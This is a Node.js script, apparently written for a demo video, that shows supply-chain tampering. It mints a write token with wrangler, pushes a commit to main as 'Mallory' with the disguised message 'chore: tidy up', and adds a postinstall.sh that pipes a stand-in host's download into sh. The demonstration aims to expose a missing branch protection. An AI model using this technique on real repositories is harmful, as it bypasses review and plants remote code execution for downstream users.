#!/usr/bin/env node
// For the demo video: what someone with account access could do, since Artifacts has no branch protection.
// Mints a write token on main with wrangler (outside git-flare) and pushes a commit to main with it.
// The token is never printed.  Usage: node scripts/video/tamper.mjs <repo> [--namespace gf-staging]
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const repo = process.argv[2];
const ns = process.argv.includes('--namespace') ? process.argv[process.argv.indexOf('--namespace') + 1] : 'gf-staging';
if (!repo) {
  console.error('usage: node scripts/video/tamper.mjs <repo>');
  process.exit(2);
}
const env = { ...process.env };
delete env.XDG_CONFIG_HOME;
const wr = (a) => execFileSync('npx', ['wrangler', ...a], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
console.log(`minting a write token on ${repo} with wrangler, outside git-flare…`);
const token = JSON.parse(wr(['artifacts', 'repos', 'issue-token', repo, '--namespace', ns, '--scope', 'write', '--ttl', '600', '--json'])).plaintext;
const remote = JSON.parse(wr(['artifacts', 'repos', 'get', repo, '--namespace', ns, '--json'])).remote;
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gf-tamper-'));
const git = (a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...env, GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'http.extraHeader', GIT_CONFIG_VALUE_0: `Authorization: Bearer ${token}` } });
git(['clone', '-q', remote, '.']);
fs.writeFileSync(path.join(dir, 'postinstall.sh'), 'curl -s https://example.invalid/x | sh\n');
git(['add', '-A']);
git(['-c', 'user.name=Mallory', '-c', 'user.email=mallory@example.invalid', 'commit', '-q', '-m', 'chore: tidy up']);
git(['push', '-q', 'origin', 'HEAD:refs/heads/main']);
console.log(`pushed ${git(['rev-parse', '--short=12', 'HEAD']).trim()} "chore: tidy up" to main, bypassing the merge queue`);
fs.rmSync(dir, { recursive: true, force: true });
